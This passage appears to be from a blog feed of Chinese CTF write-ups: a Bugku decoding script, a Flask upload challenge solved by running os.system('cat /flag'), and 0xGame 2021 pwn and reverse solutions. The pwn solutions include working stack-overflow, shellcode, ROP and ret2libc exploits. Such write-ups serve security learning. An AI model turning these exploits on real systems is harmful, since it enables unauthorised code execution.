string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 两个字符的标志位</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        k <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        k <span class="token operator">=</span> <span class="token number">1</span>ss <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l<span class="token punctuation">)</span>enc <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encrypt4</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>offset<span class="token operator">-</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt4</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token string">''</span>    offset <span class="token operator">=</span> <span class="token number">5</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token keyword">def</span> <span class="token function">encrpyt5</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt5</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    enc <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b<span class="token operator">+</span><span class="token number">26</span><span class="token operator">*</span>k<span class="token punctuation">)</span> <span class="token operator">%</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                enc <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> b <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> k<span class="token punctuation">)</span> <span class="token operator">//</span> a <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt5<span class="token punctuation">(</span>decrypt4<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="22-flask-fileupload">22 Flask_FileUpload</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>File Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/uploader<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">accept</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.jpg,.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- Give me the file, and I will return the Running results by python to you! --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用POST传参而且只传jpg或者png文件，而且上传的文件只允许是jpg png格式 且文件只会用python上传 ，构造jpg文件。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到里面存着flag文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span>  <span class="token comment">#得到flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame 2021 WriteUp</title>
      <link href="/2021/10/11/0xGame%202021%20WriteUp/"/>
      <url>/2021/10/11/0xGame%202021%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="0xGame-2021-WriteUp"><a href="#0xGame-2021-WriteUp" class="headerlink" title="0xGame 2021 WriteUp"></a>0xGame 2021 WriteUp</h1><p>[toc]</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Pwn？！"><a href="#Pwn？！" class="headerlink" title="Pwn？！"></a>Pwn？！</h3><p>附件给的其实有点多余，我给的目的是让大家知道pwn的最终目的就是执行system(“/bin/sh”)</p><p>直接nc连接上之后cat flag打开flag文件即可</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>我已经给了后门函数地址在0x40115b</p><p>有一个明显的栈溢出</p><p>ida里面显示距离rbp-0x50</p><p>那么就直接覆盖0x50个字节填充以及0x8个字节覆盖rbp即可劫持到ret地址</p><p>直接覆盖成后门函数即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10003</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40115b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WTF？Shellcode！"><a href="#WTF？Shellcode！" class="headerlink" title="WTF？Shellcode！"></a>WTF？Shellcode！</h3><p>这个题其实就是想让大家了解什么是shellcode</p><p>也就是直接执行机器码</p><p>通过上网查找或者让pwntools自己生成的方法找到一段shellcode即可</p><p>注意shellcode的编写需要熟练的汇编理解，而且日后会经常写一些复杂的shellcode</p><p>注意到执行的是buf+0x20而不是buf本身</p><p>所以填充0x20个字节再放置shellcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>shellcode<span class="token operator">=</span><span class="token string">"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="No-BackDoor"><a href="#No-BackDoor" class="headerlink" title="No BackDoor!"></a>No BackDoor!</h3><p>这题需要了解linux下寄存器传递参数的顺序</p><p>rdi rsi rdx rcx r8 r9 栈</p><p>既然存在system函数，而且查找存在/bin/sh字符串</p><p>直接控制rdi位/bin/sh字符串地址，在调用system函数</p><p>就相当于执行了system(“/bin/sh”)</p><p>而控制rdi用的是pop rdi ; ret ;</p><p>这样直接把字符串地址布置在栈上</p><p>通过pop即控制了rdi参数</p><p>(注意到这里有点小问题，就是直接执行会报错，详情可以参考<a href="http://blog.eonew.cn/archives/958">http://blog.eonew.cn/archives/958</a></p><p>需要ret一次来调整栈帧)(当然也可以直接当下一题做)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./main'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>bin_sh<span class="token operator">=</span><span class="token number">0x404040</span>system<span class="token operator">=</span><span class="token number">0x401040</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ret2libc-pro-max"><a href="#ret2libc-pro-max" class="headerlink" title="ret2libc pro max"></a>ret2libc pro max</h3><p>模板题，ctfwiki上讲的非常详细</p><p>建议遇上相似题目直接套模板</p><p>libc版本为2.23-ubuntu11.2_amd64</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'121.4.15.155'</span><span class="token punctuation">,</span><span class="token number">10004</span><span class="token punctuation">)</span><span class="token comment">#r=process('./main')</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>pop_rdi<span class="token operator">=</span><span class="token number">0x401223</span>puts_plt<span class="token operator">=</span><span class="token number">0x401030</span>puts_got<span class="token operator">=</span><span class="token number">0x404018</span>start<span class="token operator">=</span><span class="token number">0x401060</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>system<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x18ce17</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin-User-Friendly"><a href="#Signin-User-Friendly" class="headerlink" title="Signin: User Friendly"></a>Signin: User Friendly</h3><p>IDA 打开软件 直接按 <code>f5</code> 或者 <code>shift</code> + <code>f12</code> 查看字符串，即可看到flag</p><p>有人可能会想知道，每次生成的随机数是多少。实际上我也不知道。因为每次程序运行使用的随机种子都不同，所以生成的随机数也不同。如果想知道生成的随机数是多少，可以自行动态调试获知，再输入程序获取flag</p><h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p><a href="https://github.com/upx/upx" title="UPX链接">UPX github链接</a></p><p>脱壳命令 <code>upx -d test.exe</code></p><p>这里还需要知道一下 <code>(a&amp;~b | b&amp;~a) == a ^ b</code> 这两个运算相等</p><p>解题脚本</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [161, 15, 188, 111, 218, 169, 159, 94, 41, 246, 197, 228, 110, 242, 177, 56, 27, 1, 17, 256, 256, 50, 233, 65, 104, 2, 4, 6, 42, 112, 55, 107, 48, 93, 130, 232, 37, 87, 242, 130]enc &#x3D; [145, 119, 251, 14, 183, 204, 228, 56, 17, 148, 253,133, 92, 145, 132, 92, 125, 103, 39, 308, 309, 10, 216, 35, 13, 48, 101, 62, 19, 69, 84, 82, 81, 62, 176, 217, 19, 51, 195, 255]for i in range(0,40):    print(chr(arr[i] ^ enc[i]), end &#x3D; &quot;&quot;)# 0xGame&#123;f8b8a2c5dff64581be2a895c9ac216d1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Our-Compilation-Story"><a href="#Our-Compilation-Story" class="headerlink" title="Our Compilation Story"></a>Our Compilation Story</h3><p>简单 python 代码，读懂就可以做</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [21,44,45,104,31,30,26,121,65,125,23,112,77,46,47,126,89,112,7,109,7,88,10,105,104,59,54,91,83,98,32,54,15,65,113,119,113]arr &#x3D; arr[::-1]for i in range(0,len(arr) - 3):    print(chr(arr[i] ^ arr[i + 3]), end &#x3D; &quot;&quot;)# 0xGame&#123;Th3_10ng_w4y_w3_901ng_fr33&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Random-Chaos"><a href="#Random-Chaos" class="headerlink" title="Random Chaos"></a>Random Chaos</h3><p>C语言 <code>rand</code> 函数生成的随机数是伪随机数，本质是一个线性同余发生器，在随机种子给定的情况下每次生成的随机数序列相同，所以直接异或就可以</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;unsigned char enc[41] &#x3D; &#123;0x22, 0xca, 0x7, 0x19, 0xf8, 0xfb, 0x28, 0x9d, 0x1e, 0x80, 0xac, 0xc9, 0x60, 0x46, 0x18, 0x21, 0xdf, 0x95, 0xd5, 0x70, 0xc5, 0x19, 0xea, 0xb0, 0x9c, 0x83, 0x11, 0x4a, 0x93, 0xc7, 0x91, 0xf6, 0x14, 0x71, 0x2f, 0x22, 0x14, 0xbf, 0x58, 0x76&#125;; int main()&#123;    srand(0x2021);    for (int i &#x3D; 0; i &lt; 40; ++i)    &#123;        printf(&quot;%c&quot;,(enc[i] ^ (rand() &amp; 0xff)));    &#125;    return 0;&#125;&#x2F;&#x2F; 0xGame&#123;d6ca93397ecb4d4e83792a7100737932&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Neverland"><a href="#Neverland" class="headerlink" title="Neverland"></a>Neverland</h3><p>递归深度比较小的时候，递归求解还能出结果</p><p>当递归深度非常大时候，时间不够求解出结果，所以flag只能输出一半</p><p>可以看一下文章按照优化斐波那契数列的方法优化一下func函数(<em>比如将递归转换为一个循环函数进行计算，虽然也慢，但与递归相比是非常的快了</em>)，就能输出正确结果</p><p><a href="https://blog.csdn.net/qq_41035588/article/details/81814547," title="斐波那契数列优化">【C语言】斐波那契数列四种优化求解</a></p><p><strong>当然不看以上方法也可以</strong>，我们知道 <code>int</code> 型数据储存数据有范围限制，而且可以知道这个数列在不断增大，所以 <code>func</code> 函数每次返回的数据，相当于数列中对应数据的值对 0x10000000 取模</p><p>斐波那契数列对某一个数取模会出现循环节，这个数列也同样如此，我们将<code>func</code>函数写一遍，按顺序输出一些数就可以发现规律了</p><p>测试代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">def func(n):    if (n &#x3D;&#x3D; 0):        return 7    if (n &#x3D;&#x3D; 1):        return 8    return (3 * func(n-1) + 4 * func(n-2)) &amp; 0xfffffffffor i in range(1,50):    print(i,&quot;:&quot;,func(i))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">0 : 71 : 82 : 523 : 1884 : 7725 : 30686 : 122927 : 491488 : 1966129 : 78642810 : 314573211 : 1258290812 : 5033165213 : 20132658814 : 80530637215 : 322122546816 : 417 : 429496729218 : 419 : 429496729220 : 421 : 429496729222 : 423 : 429496729224 : 425 : 429496729226 : 427 : 429496729228 : 429 : 429496729230 : 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很容易就发现循环节了把，所以接下来就是直接异或操作就行，代码比较简单，这里就不写了</p><p>甚至我们可以求出这个数列的通项公式，也很容易得到这个数列的每一个数据对应的值，下面给出一个知乎链接讲述形如斐波那契数列的数列如何求通项公式</p><p><a href="https://www.zhihu.com/question/25217301" title="斐波那契通项公式">斐波那契数列通项公式是怎样推导出来的？-知乎</a></p><p>通项公式为 <code>a(n) = 3 * 4 ** n + 4 * (-1) ** n</code></p><h3 id="Roundabout"><a href="#Roundabout" class="headerlink" title="Roundabout"></a>Roundabout</h3><p>脱壳后，简单的利用 key 来循环异或，代码如下</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">arr &#x3D; [68, 16, 46, 18, 50, 12, 8, 61, 86, 10, 16, 103, 0, 65, 0, 1, 70, 90, 68, 66, 110, 12, 68, 114, 12, 13, 64, 62, 75, 95, 2, 1, 76, 94, 91, 23, 110, 12, 22, 104, 91, 18]h &#x3D; &quot;this_is_not_flag\x00&quot;flag &#x3D; &quot;&quot;for i in range(0, 42):    flag +&#x3D; chr(ord(h[i % 16]) ^ arr[i])print(flag)# 